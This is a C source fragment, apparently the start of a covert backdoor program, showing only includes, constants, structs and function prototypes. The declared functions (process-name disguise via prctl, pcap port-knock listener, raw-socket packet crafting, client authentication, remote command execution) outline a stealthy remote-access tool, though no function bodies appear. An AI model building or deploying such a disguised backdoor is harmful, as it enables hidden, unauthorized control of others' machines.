#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>   	// TCP Header definitions
#include <netinet/ip.h>    	// IP Header definitions
#include <sys/types.h>
#include <unistd.h>
#include <netinet/if_ether.h> 
#include <pcap.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/prctl.h>

#define PKT_SIZE			4096
#define DEFAULT_TTL			128
#define DEFAULT_DST_PORT	8080
#define DEFAULT_SRC_IP		"192.168.0.25"
#define OPTIONS 			"?h:d:s:p:"
#define MAXLINE				80
#define CMD					"tcp and src host %s and src port %d or udp"
#define TRUE				1
#define FALSE				0

int ExitFlag;

// Globals
typedef struct
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
}pseudo_header;

typedef struct
{
    int RawSocket;
    char *DstHost;
    char *SrcHost;
    int dport;
    int sport;
}AddrInfo;

typedef struct
{
    pcap_t* nic_descr;
    bpf_u_int32 netp;
    char cmd[MAXLINE];
}PcapInfo;

// Function Prototypes
void* SendDatagram (void *);
void usage (char **argv);
unsigned short csum (unsigned short *, int);
void* ReceiveDatagram (void *);
char * resolve_host (const char *);
char * GetIPAddress (void);
void disguise(char ** argv);
char* getDisguise();
void setDisguise(char * disguise, char * argv);
int main(int argc, char** argv);
void initializeSocket();
void initializePcap();
void initializeDoor();
void checkArgs(int argc, int **argv);
void usage(char ** argv);
void setupSignals();
void authenticateClient();
static void endProgram (int signo);
static void unlock (int signo);
void* knockListener(void* pcap_arg);
void executeCommand();
void spawnThread();
void setConfig();
char* readConfigFile();
void pcapListen();
void pcapCompile();
void pcapFilter();
int checkPacketSize();
void packetHandler();
int PrintInHex(char *mesg, unsigned char *p, int len);